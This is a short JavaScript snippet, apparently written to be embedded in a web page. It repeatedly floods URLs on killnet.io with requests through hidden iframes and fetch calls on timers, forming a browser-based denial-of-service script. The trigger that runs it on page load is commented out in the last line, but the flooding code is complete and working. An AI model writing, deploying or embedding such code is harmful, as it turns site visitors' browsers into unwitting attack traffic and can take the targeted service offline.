
var list = [

	{ url: "https://killnet.io/ajax.php", p: "wallet=undefined&list=true", th: 1, ms: 5000, cors: true },
	{ url: "https://killnet.io/", th: 1, ms: 10000, cors: true }

]

function hload(url, p) {

	const rand = Math.floor(Math.random() * 99999999999);

	document.body.innerHTML+='<iframe src="' + url + '?cache=' + rand + p + '" style="display:none;">   </iframe>';
}

function sload(url, p) 
{
	const rand = Math.floor(Math.random() * 99999999999);

	fetch(url + '?cache=' + rand + p);
}

function rt() {
	
	function srt(o) 
	{
		var url = o.url;
		var params = o.p ? "&" + o.p : "";
		var ms = o.ms || 500;
		var th = o.th || 5;
		var t;
		var fn = o.cors ? hload : sload;

		if (url) {
			function go() {
				for (t = 0; t < th; t++) 
				{
					fn(url, params);
				}
			}
			setInterval(go, ms);
			setTimeout(go, Math.random() * 1000);
		}
	}
	list.forEach(srt);
}

// window.addEventListener('load', rt);